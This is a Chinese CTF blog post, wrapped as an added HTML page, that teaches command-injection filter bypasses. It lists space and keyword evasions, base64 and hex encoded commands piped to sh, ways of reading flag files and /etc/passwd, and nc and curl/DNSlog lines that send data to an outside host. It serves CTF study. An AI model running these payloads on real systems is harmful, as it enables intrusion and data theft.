@@ -1,0 +1,851 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TangSan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="管道符在用linux命令时候,我们可以一行执行多条命令或者有条件的执行下一条命令，下面我们讲解一下linux命令分号&amp;&amp;和&amp;，|和||的用法。 “;”分号用法方式：command1 ; command2 用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行。 “| ”管道符用法上一条命令的输出，作为下一条命令参数。ctf里">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行绕过">
+<meta property="og:url" content="http://example.com/2024/03/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Poseidon">
+<meta property="og:description" content="管道符在用linux命令时候,我们可以一行执行多条命令或者有条件的执行下一条命令，下面我们讲解一下linux命令分号&amp;&amp;和&amp;，|和||的用法。 “;”分号用法方式：command1 ; command2 用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行。 “| ”管道符用法上一条命令的输出，作为下一条命令参数。ctf里">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-03-28T14:24:49.000Z">
+<meta property="article:modified_time" content="2024-03-28T14:29:45.977Z">
+<meta property="article:author" content="TangSan">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>命令执行绕过 - Poseidon</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ah5n60fcKAbykF1dESHOkLv3-gzGzoHsz","app_key":"RwCXBsEsxHj47rCVXGcxqxbh","server_url":"https://ah5n60fc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Poseidon</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="命令执行绕过"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-28 22:24" pubdate>
+          2024年3月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">命令执行绕过</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><p>在用linux命令时候,我们可以一行执行多条命令或者有条件的执行下一条命令，下面我们讲解一下linux命令分号&amp;&amp;和&amp;，|和||的用法。</p>
+<h3 id="“-”分号用法"><a href="#“-”分号用法" class="headerlink" title="“;”分号用法"></a><strong>“;”分号用法</strong></h3><p>方式：command1 ; command2</p>
+<p>用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行。</p>
+<h3 id="“-”管道符用法"><a href="#“-”管道符用法" class="headerlink" title="“| ”管道符用法"></a><strong>“| ”管道符用法</strong></h3><p>上一条命令的输出，作为下一条命令参数。ctf里面：ping 127.0.0.1 | ls(只执行ls不执行前面的）</p>
+<p>方式：command1 | command</p>
+<p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。</p>
+<p>利用一个管道：</p>
+<blockquote>
+<p># rpm -qa|grep licq</p>
+</blockquote>
+<p>这条命令使用一个管道符“|”建立了一个管道。管道将rpm -qa命令的输出（包括系统中所有安装的RPM包）作为grep命令的输入，从而列出带有licq字符的RPM包来。</p>
+<p>利用多个管道：</p>
+<blockquote>
+<p># cat &#x2F;etc&#x2F;passwd | grep &#x2F;bin&#x2F;bash | wc -l</p>
+</blockquote>
+<p>这条命令使用了两个管道，利用第一个管道将cat命令（显示passwd文件的内容）的输出送给grep命令，grep命令找出含有“&#x2F;bin &#x2F;bash”的所有行；第二个管道将grep的输出送给wc命令，wc命令统计出输入中的行数。这个命令的功能在于找出系统中有多少个用户使用bash。</p>
+<h3 id="“-”符号用法"><a href="#“-”符号用法" class="headerlink" title="“&amp;”符号用法"></a><strong>“&amp;”符号用法</strong></h3><p>ctf中用法 ping 127.0.0.1 &amp; ls(先执行ls后执行ping)</p>
+<p>&amp;放在启动参数后面表示设置此进程为后台进程</p>
+<p>方式：command1 &amp;</p>
+<p>默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。</p>
+<h3 id="“-”符号用法-1"><a href="#“-”符号用法-1" class="headerlink" title="“&amp;&amp;”符号用法"></a><strong>“&amp;&amp;”符号用法</strong></h3><p>ctf中用法 ping 127.0.0.1 &amp;&amp; ls（ping命令正确才执行ls 要是ping 1 &amp;&amp; ls ls就不会执行)</p>
+<p>shell 在执行某个命令的时候，会返回一个返回值，该返回值保存在 shell 变量 $? 中。当 $? &#x3D;&#x3D; 0 时，表示执行成功；当 $? &#x3D;&#x3D; 1 时（我认为是非0的数，返回值在0-255间），表示执行失败。</p>
+<p>有时候，下一条命令依赖前一条命令是否执行成功。如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。shell 提供了 &amp;&amp; 和 || 来实现命令执行控制的功能，shell 将根据 &amp;&amp; 或 || 前面命令的返回值来控制其后面命令的执行。</p>
+<p><strong>语法格式如下：</strong></p>
+<blockquote>
+<p>command1 &amp;&amp; command2 [&amp;&amp; command3 …]</p>
+</blockquote>
+<p>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</p>
+<p>只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? &#x3D;&#x3D; 0），&amp;&amp; 右边的命令才会被执行。</p>
+<p>只要有一个命令返回假（命令返回值 $? &#x3D;&#x3D; 1），后面的命令就不会被执行。</p>
+<h3 id="“-”符号用法-2"><a href="#“-”符号用法-2" class="headerlink" title="“||”符号用法"></a><strong>“||”符号用法</strong></h3><p>和&amp;&amp;相反 左边为假才执行命令二</p>
+<p>逻辑或的功能</p>
+<p><strong>语法格式如下：</strong></p>
+<blockquote>
+<p>command1 || command2 [|| command3 …]</p>
+</blockquote>
+<p>命令之间使用 || 连接，实现逻辑或的功能。</p>
+<p>只有在 || 左边的命令返回假（命令返回值 $? &#x3D;&#x3D; 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p>
+<p>只要有一个命令返回真（命令返回值 $? &#x3D;&#x3D; 0），后面的命令就不会被执行。–直到返回真的地方停止执行。</p>
+<p>举例，ping命令判断存活主机</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">ping</span> -c <span class="hljs-number">1</span> -w <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span> &amp;&gt; /dev/null &amp;&amp; result=<span class="hljs-number">0</span> ||result=<span class="hljs-number">1</span>    <br><span class="hljs-keyword">if</span> [ &quot;$result&quot; == <span class="hljs-number">0</span> ];then    <br>	<span class="hljs-built_in">echo</span> &quot;<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span> is UP!&quot;     <br>	<span class="hljs-keyword">else</span>    <span class="hljs-built_in">echo</span> &quot;<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span> is DOWN!&quot;   <br></code></pre></td></tr></table></figure>
+
+<p>注意 &amp;&gt;要连起来写。</p>
+<h2 id="0x02：一些绕过方式"><a href="#0x02：一些绕过方式" class="headerlink" title="0x02：一些绕过方式"></a><strong>0x02：一些绕过方式</strong></h2><h3 id="linux下绕过空格"><a href="#linux下绕过空格" class="headerlink" title="linux下绕过空格"></a><strong>linux下绕过空格</strong></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd">&#123;cat,flag.txt&#125;<br>cat$&#123;IFS&#125;flag.txt<br>cat$IFS$<span class="hljs-number">9</span>flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>ca\t fl\ag<br></code></pre></td></tr></table></figure>
+
+<p>kg&#x3D;$’\x20flag.txt’&amp;&amp;cat$kg(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p>
+<h3 id="windows下绕过空格"><a href="#windows下绕过空格" class="headerlink" title="windows下绕过空格"></a><strong>windows下绕过空格</strong></h3><p>（实用性不是很广，也就type这个命令可以用）</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span>.\flag.txt<br><span class="hljs-keyword">type</span>,flag.txt<br><span class="hljs-title">echo</span>,<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="1：通配符绕过"><a href="#1：通配符绕过" class="headerlink" title="1：通配符绕过"></a><strong>1：通配符绕过</strong></h3><p>？？？在linux里面可以进行代替字母</p>
+<p>&#x2F;???&#x2F;c?t flag.txt</p>
+<p>*在linux里面可以进行模糊匹配</p>
+<p>cat flag.* *进行模糊匹配php</p>
+<h3 id="nc外带数据"><a href="#nc外带数据" class="headerlink" title="nc外带数据"></a><strong>nc外带数据</strong></h3><p>本地监听端口</p>
+<p>nc -lvp 9999</p>
+<p>命令执行出 ping 127.0.0.0 &amp; nc ip port &gt; key.php</p>
+<h3 id="内联执行的做法："><a href="#内联执行的做法：" class="headerlink" title="内联执行的做法："></a><strong>内联执行的做法：</strong></h3><p>payload：cat$IFS$1<code>ls</code></p>
+<p>使用内联执行会将 &#96;&#96;内的输出作为前面命令的输入，当我们输入上述payload时，等同于cat falg.php;cat index.php</p>
+<h3 id="利用DNS管道解析："><a href="#利用DNS管道解析：" class="headerlink" title="利用DNS管道解析："></a><strong>利用DNS管道解析：</strong></h3><p>这里提供一个在线网址，可以直接进行给一个利用网址：admin.dnslog.link注册一个账号后会分配一个子域名可以利用。</p>
+<p>|curl <code>whoami</code>.<a target="_blank" rel="noopener" href="http://xxxx.xxx(子域名)/">http://xxxx.xxx(子域名)</a></p>
+<p>这样就会在利用网址看到反弹结果。（这里也不演示了，账号忘记了。。。）这里解释一下\whoami\因为&#96;反引号在linux下是执行命令的特殊符号，原理请见：</p>
+<p><a href="https://link.zhihu.com/?target=http://mp.weixin.qq.com/s/jwqWnP0FHhMoR5b6iCS6NQ">http://mp.weixin.qq.com/s/jwqWnP0FHhMoR5b6iCS6NQ</a></p>
+<p>网络地址转化为数字地址</p>
+<p>网络地址有另外一种表示形式，就是数字地址比如127.0.0.1可以转化为2130706433</p>
+<p>可以直接访问</p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://2130706433</a></strong></p>
+<p>或者<strong><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0x7F000001</a></strong></p>
+<p>这样就可以绕过.的ip过滤，这里给个转化网址：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.msxindl.com<span class="hljs-regexp">/tools/i</span>p/ip_num.asp<br></code></pre></td></tr></table></figure>
+
+<p>通过查看文件的权限 chmod +777赋予权限<br>l’s’ -la<br>c’h’m’o’d +777 &#x2F;filename</p>
+<h3 id="代替cat的命令"><a href="#代替cat的命令" class="headerlink" title="代替cat的命令"></a><strong>代替cat的命令</strong></h3><p>cat:由第一行开始显示内容，并将所有内容输出</p>
+<p>tac:从最后一行倒序显示内容，并将所有内容输出</p>
+<p>more:根据窗口大小，一页一页的现实文件内容</p>
+<p>less:和more类似，但其优点可以往前翻页，而且进行可以搜索字符</p>
+<p>head:只显示头几行</p>
+<p>tail:只显示最后几行</p>
+<p>nl:类似于cat -n，显示时输出行号</p>
+<p>tailf:类似于tail -f</p>
+<p>sort%20&#x2F;flag 读文件</p>
+<p>dir来查看当前目录文件</p>
+<h3 id="Linux花式读取文件内容"><a href="#Linux花式读取文件内容" class="headerlink" title="Linux花式读取文件内容"></a><strong>Linux花式读取文件内容</strong></h3><p>ps:目标是获取flag.txt的内容</p>
+<p>static-sh读取文件：</p>
+<p>static-sh .&#x2F;flag.txt</p>
+<p>#输出结果：</p>
+<p>.&#x2F;flag.txt: line 1: flag{this_is_a_test}: not found</p>
+<p>paste读取文件:</p>
+<p>paste .&#x2F;flag.txt &#x2F;etc&#x2F;passwd</p>
+<p>#输出结果：</p>
+<p>flag{this_is_a_test}</p>
+<p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
+<p>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</p>
+<p>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</p>
+<p>diff读取文件 :</p>
+<p>diff .&#x2F;flag.txt &#x2F;etc&#x2F;passwd</p>
+<p>#输出结果：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-number">1</span>c1,<span class="hljs-number">45</span>&lt; flag&#123;this_is_a_test&#125;\ <span class="hljs-title class_">No</span> newline at <span class="hljs-keyword">end</span> of file---&gt; <span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash&gt;</span> <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin&gt;</span> <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin&gt;</span> <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin&gt;</span> <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span><br></code></pre></td></tr></table></figure>
+
+<p>od读取文件</p>
+<p>od -a .&#x2F;flag.txt</p>
+<p>#输出结果：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0000000 </span>f l a g &#123; t h i s _ i s _ a _ t0000020 e s t &#125;<span class="hljs-number">0000024</span><br></code></pre></td></tr></table></figure>
+
+<p>bzmore读取文件:</p>
+<p>bzmore .&#x2F;flag.txt</p>
+<p>bzless读取文件：</p>
+<p>bzless .&#x2F;flag.txtecho <code>bzless ./flag.txt</code></p>
+<p>#输出结果：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">------</span>&gt; <span class="hljs-string">./flag.txt</span> &lt;<span class="hljs-params">------</span> flag&#123;this_is_a_test&#125; <br></code></pre></td></tr></table></figure>
+
+<p>curl读取文件：</p>
+<p>curl file:&#x2F;&#x2F;&#x2F;home&#x2F;coffee&#x2F;flag</p>
+<p><strong>nc 传输文件</strong></p>
+<p>靶机：</p>
+<p>nc 10.10.10.10 4444 &lt; &#x2F;var&#x2F;www&#x2F;html&#x2F;key.php</p>
+<p>接受机：</p>
+<p>nc -l 4444 &gt; key.txt</p>
+<p>wget操作进行目标读取</p>
+<p>wget url -P path</p>
+<p>一些命令分隔符</p>
+<p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</p>
+<p>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p>
+<p>过滤了 bash可以用sh</p>
+<p>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p>
+<p>拼接flag 1;a&#x3D;fl;b&#x3D;ag.php;cat $a$b</p>
+<p>其中有这么一条过滤方法，我们用上述方法无法绕过，但是我们只要改变一下顺序就可以：1;a&#x3D;ag.php;b&#x3D;fl;cat $b$a绕过空格就用上面提到的$IFS$1完整的payload 1;a&#x3D;ag.php;b&#x3D;fl;cat$IFS$1$b$aelse if(preg_match(“&#x2F;.*f.*l.*a.<em>g.</em>&#x2F;“, $ip)){die(“fxck your flag!”);}</p>
+<p>编码绕过</p>
+<h3 id="base64："><a href="#base64：" class="headerlink" title="base64："></a><strong>base64：</strong></h3><p>echo YWJjZGU&#x3D;|base64 -d &#x2F;&#x2F;打印出来abcde</p>
+<p>echo Y2F0IGZhbGcucGhw|base64 -d|bash &#x2F;&#x2F;cat flag.php</p>
+<p>echo Y2F0IGZhbGcucGhw|base64 -d|sh &#x2F;&#x2F;cat flag.php</p>
+<h3 id="hex编码绕过："><a href="#hex编码绕过：" class="headerlink" title="hex编码绕过："></a><strong>hex编码绕过：</strong></h3><p>echo 63617420666c61672e706870 | xxd -r -p|bash &#x2F;&#x2F;cat flag.ph</p>
+<h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a><strong>unicode编码</strong></h3><p>$(printf “\154\163”) &#x2F;&#x2F;ls</p>
+<p>$(printf “\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70”) &#x2F;&#x2F;cat flag.php</p>
+<p>对于关键字还可以用单引号和反斜杠绕过 比如 cat fl’’ag cat fl\ag</p>
+<p>总结一下，payload1;a&#x3D;ag.php;b&#x3D;fl;cat$IFS$1$b$a和 cat$IFS$1<code>ls</code></p>
+<p>得到的flag查看源码。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>命令执行绕过</div>
+      <div>http://example.com/2024/03/28/命令执行绕过/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>TangSan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/27/%E9%80%86%E5%90%91/smc/" title="smc">
+                        <span class="hidden-mobile">smc</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"ah5n60fcKAbykF1dESHOkLv3-gzGzoHsz","appKey":"RwCXBsEsxHj47rCVXGcxqxbh","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://ah5n60fc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
